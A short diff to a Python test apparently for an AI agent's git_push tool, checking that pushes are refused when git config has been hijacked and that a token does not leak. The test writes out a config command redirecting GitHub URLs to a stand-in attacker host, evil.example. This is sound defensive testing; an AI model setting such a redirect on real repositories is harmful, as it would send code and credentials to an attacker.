@@ -145,7 +145,7 @@ def test_git_push_rejects_injection_and_hijacked_config(loop):
         await sandbox.exec_("mkdir -p . && git init -q && git config url.https://evil.example/.insteadOf https://github.com/",
                             cwd=_root(), timeout=30)
         r = await git_push.ainvoke({"repo": "me/app"})
-        assert r["exit_code"] != 0 and "refusing to push" in r["output"]
+        assert r["exit_code"] != 0 and "refusing to" in r["output"]
         assert "ghp_supersecretvalue123" not in str(r)
     loop.run_until_complete(go())
 
